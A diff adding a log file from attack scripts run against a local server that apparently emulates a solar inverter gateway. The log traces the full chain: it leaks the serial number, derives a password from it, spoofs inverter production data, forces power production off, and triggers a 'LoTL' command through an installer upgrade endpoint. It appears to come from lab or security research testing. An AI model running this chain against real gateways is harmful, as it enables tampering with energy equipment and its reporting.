@@ -1,0 +1,164 @@
+2025-06-25 10:14:32,107 [INFO] - [*] Running spoof attack...
+2025-06-25 10:14:32,112 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:14:34,162 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 10:14:34,164 [INFO] - [+] Serial number leaked: 1234567890ENPH
+2025-06-25 10:14:34,165 [INFO] - [+] Derived password: 9448343b
+2025-06-25 10:14:34,167 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:14:36,213 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 10:14:36,215 [INFO] - [+] Auth token received: authtok_9448343b
+2025-06-25 10:14:36,218 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:14:38,261 [DEBUG] - http://localhost:5000 "POST /api/spoof HTTP/1.1" 200 34
+2025-06-25 10:14:38,262 [INFO] - [+] Successfully spoofed production data.
+2025-06-25 10:15:05,579 [INFO] - [*] Running power disable attack...
+2025-06-25 10:15:05,583 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:15:07,639 [DEBUG] - http://localhost:5000 "POST /ivp/mod/603980032/mode/power HTTP/1.1" 200 52
+2025-06-25 10:15:07,641 [INFO] - [+] Power production disabled successfully.
+2025-06-25 10:15:07,642 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:15:09,685 [DEBUG] - http://localhost:5000 "GET /ivp/mod/603980032/mode/power HTTP/1.1" 200 24
+2025-06-25 10:15:09,686 [INFO] - [*] Current power state: {'powerForcedOff': True}
+2025-06-25 10:49:42,366 [INFO] - [*] Running spoof attack...
+2025-06-25 10:49:42,370 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:49:44,432 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 10:49:44,434 [INFO] - [+] Serial number leaked: 1234567890ENPH
+2025-06-25 10:49:44,434 [INFO] - [+] Derived password: 9448343b
+2025-06-25 10:49:44,436 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:49:46,477 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 10:49:46,480 [INFO] - [+] Auth token received: authtok_9448343b
+2025-06-25 10:49:46,485 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:49:48,526 [DEBUG] - http://localhost:5000 "POST /api/spoof HTTP/1.1" 404 207
+2025-06-25 11:43:30,174 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 11:43:32,229 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 11:43:32,233 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 11:43:34,274 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 11:43:34,278 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 11:43:36,318 [DEBUG] - http://localhost:5000 "GET /api/v1/production/inverters HTTP/1.1" 200 170
+2025-06-25 11:43:36,322 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 11:43:38,376 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003401 HTTP/1.1" 200 32
+2025-06-25 11:43:38,380 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 11:43:40,427 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003402 HTTP/1.1" 200 32
+2025-06-25 11:43:40,429 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 11:43:42,486 [DEBUG] - http://localhost:5000 "GET /api/v1/production HTTP/1.1" 200 96
+2025-06-25 13:26:09,687 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:11,743 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:26:11,746 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:13,782 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:26:13,785 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:15,828 [DEBUG] - http://localhost:5000 "GET /api/v1/production/inverters HTTP/1.1" 200 172
+2025-06-25 13:26:15,831 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:17,875 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003401 HTTP/1.1" 200 32
+2025-06-25 13:26:17,878 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:19,933 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003402 HTTP/1.1" 200 32
+2025-06-25 13:26:19,936 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:21,981 [DEBUG] - http://localhost:5000 "GET /api/v1/production HTTP/1.1" 200 96
+2025-06-25 13:26:48,459 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:50,506 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:26:50,510 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:52,558 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:26:52,561 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:54,601 [DEBUG] - http://localhost:5000 "GET /api/v1/production/inverters HTTP/1.1" 200 170
+2025-06-25 13:26:54,604 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:56,664 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003401 HTTP/1.1" 200 32
+2025-06-25 13:26:56,667 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:26:58,717 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003402 HTTP/1.1" 200 32
+2025-06-25 13:26:58,719 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:27:00,764 [DEBUG] - http://localhost:5000 "GET /api/v1/production HTTP/1.1" 200 96
+2025-06-25 13:27:11,597 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:27:13,659 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:27:13,663 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:27:15,719 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:27:15,722 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:27:17,772 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 400 35
+2025-06-25 13:32:59,272 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:33:01,332 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:33:01,336 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:33:03,388 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:33:03,391 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:33:05,519 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 500 36
+2025-06-25 13:33:51,457 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:33:53,499 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:33:53,503 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:33:55,558 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:33:55,562 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:33:57,661 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 500 36
+2025-06-25 13:35:15,887 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:35:17,940 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:35:17,944 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:35:19,988 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:35:19,991 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:35:22,106 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 500 36
+2025-06-25 13:36:41,268 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:36:43,330 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:36:43,333 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:36:45,387 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:36:45,390 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:36:47,519 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 500 36
+2025-06-25 13:38:28,479 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:38:30,533 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:38:30,536 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:38:32,581 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:38:32,585 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:38:34,714 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 500 36
+2025-06-25 13:41:08,749 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:41:10,805 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:41:10,808 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:41:12,843 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:41:12,847 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:41:14,932 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 500 36
+2025-06-25 13:42:34,534 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:42:36,582 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:42:36,585 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:42:38,620 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:42:38,623 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:42:40,685 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 500 36
+2025-06-25 13:45:27,337 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:45:29,398 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:45:29,403 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:45:31,459 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:45:31,463 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:45:33,572 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 200 29
+2025-06-25 13:47:02,023 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:47:04,078 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:47:04,083 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:47:06,118 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:47:06,120 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:47:08,216 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 200 29
+2025-06-25 13:53:35,766 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:53:37,831 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:53:37,833 [INFO] - Serial Number: 1234567890ENPH
+2025-06-25 13:53:37,833 [INFO] - Derived Password: 9448343b
+2025-06-25 13:53:37,835 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:53:39,890 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:53:39,891 [INFO] - Got auth token
+2025-06-25 13:53:39,893 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:53:42,003 [DEBUG] - http://localhost:5000 "POST /installer/upgrade_start HTTP/1.1" 200 29
+2025-06-25 13:53:42,004 [INFO] - LoTL attack successful!
+2025-06-25 13:53:42,004 [INFO] - No output returned from command.
+2025-06-25 13:54:18,499 [INFO] - Starting spoof attack...
+2025-06-25 13:54:18,502 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:20,560 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 13:54:20,562 [INFO] - [+] Serial Number: 1234567890ENPH
+2025-06-25 13:54:20,563 [INFO] - [+] Derived Password: 9448343b
+2025-06-25 13:54:20,565 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:22,620 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 13:54:22,621 [INFO] - [+] Got auth token
+2025-06-25 13:54:22,623 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:24,663 [DEBUG] - http://localhost:5000 "GET /api/v1/production/inverters HTTP/1.1" 200 172
+2025-06-25 13:54:24,664 [INFO] - [+] Found 2 inverters
+2025-06-25 13:54:24,664 [INFO] - [~] Updating inverter 121715003401 to 10 watts
+2025-06-25 13:54:24,666 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:26,712 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003401 HTTP/1.1" 200 32
+2025-06-25 13:54:26,713 [INFO] - Updated inverter 121715003401: {'message': 'Inverter updated.'}
+2025-06-25 13:54:26,714 [INFO] - [~] Updating inverter 121715003402 to 10 watts
+2025-06-25 13:54:26,716 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:28,761 [DEBUG] - http://localhost:5000 "POST /api/v1/production/inverters/121715003402 HTTP/1.1" 200 32
+2025-06-25 13:54:28,762 [INFO] - Updated inverter 121715003402: {'message': 'Inverter updated.'}
+2025-06-25 13:54:28,764 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:30,815 [DEBUG] - http://localhost:5000 "GET /api/v1/production HTTP/1.1" 200 96
+2025-06-25 13:54:30,817 [INFO] - [+] Final wattsNow: 20
+2025-06-25 13:54:38,613 [INFO] - [*] Running power disable attack...
+2025-06-25 13:54:38,616 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:40,679 [DEBUG] - http://localhost:5000 "POST /ivp/mod/603980032/mode/power HTTP/1.1" 200 52
+2025-06-25 13:54:40,680 [INFO] - [+] Power production disabled successfully.
+2025-06-25 13:54:40,682 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 13:54:42,725 [DEBUG] - http://localhost:5000 "GET /ivp/mod/603980032/mode/power HTTP/1.1" 200 24
+2025-06-25 13:54:42,726 [INFO] - [*] Current power state: {'powerForcedOff': True}
